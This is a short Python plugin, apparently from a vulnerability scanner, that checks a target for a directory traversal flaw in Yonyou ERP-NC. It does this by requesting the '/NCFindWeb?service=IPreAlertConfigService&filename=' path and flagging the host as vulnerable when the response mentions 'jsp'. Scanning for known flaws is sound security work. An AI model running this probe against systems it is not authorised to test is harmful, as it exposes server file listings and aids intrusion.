import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def YongYou_dict(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    vuln_url = urldata + '/NCFindWeb?service=IPreAlertConfigService&filename='
    response = requests.get(url=vuln_url)
    try:
        if 'jsp' in response.text:
            print(Vcolors.RED + "[!] 存在用友ERP-NC 目录遍历漏洞\r" + Vcolors.ENDC)
            

    except:
        logging.error("YongYou_dict脚本出现异常")


